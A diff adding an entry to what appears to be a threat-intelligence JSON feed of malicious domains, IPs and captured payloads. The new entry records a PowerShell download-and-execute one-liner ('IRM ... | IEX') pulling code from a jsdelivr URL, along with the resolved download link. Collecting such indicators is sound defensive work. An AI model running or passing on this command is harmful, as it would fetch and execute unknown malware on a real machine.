@@ -118,5 +118,22 @@
     ],
     "ReportId": "cmwg9lbgo0l4u0omlslp8xa75",
     "ScannedAt": "2026-11-14T10:30:14.635000+00:00"
+  },
+  {
+    "UrlDomain": "akk-finaudit.com",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "91.236.136.138"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmwgfhtxn0l8j0omldvxcqc8p",
+    "ScannedAt": "2026-11-14T13:15:29.637000+00:00"
   }
 ]
